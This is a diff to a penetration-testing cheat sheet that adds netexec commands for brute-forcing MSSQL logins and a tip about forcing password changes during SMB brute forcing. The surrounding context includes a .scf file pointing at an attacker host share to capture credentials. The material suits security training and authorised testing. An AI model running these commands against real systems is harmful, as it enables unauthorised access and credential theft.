@@ -118,6 +118,7 @@ enum4linux-ng.py $TARGET_IP -A
 # Downloading files
 smbmap -H $TARGET_IP -u $USER -p $PASS --download $FILE_PATH
 ```
+>  Look for STATUS_PASSWORD_MUST_CHANGE when brute forcing, you can change the password of the user
 
 ```shell
 # Enumerating using rpcclient
@@ -212,6 +213,13 @@ Command=2
 IconFile=\\$ATTACKER_IP\share\blahblah
 [Taskbar]
 Command=ToggleDesktop
+```
+
+- Other exploits using netexec
+
+```shell
+# Password GPP
+
 ```
 
 ## NFS
@@ -338,6 +346,19 @@ msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts $TARGET_IP
 # Connecting to service
 impacket-mssqlclient $USERNAME@$TARGET_IP
 impacket-mssqlclient $USERNAME@$TARGET_IP -windows-auth
+```
+
+- Brute forcing
+
+```shell
+# Domain account
+netexec mssql $TARGET_IP -u $USERNAME -p $PASSWORD -d $DOMAIN
+
+# Local Windows account
+netexec mssql $TARGET_IP -u $USERNAME -p $PASSWORD -d .
+
+# MSSQL Account
+netexec mssql $TARGET_IP -u $USERNAME -p $PASSWORD --local-auth
 ```
 
 - Execute commands on mssql server using xp_cmdshell
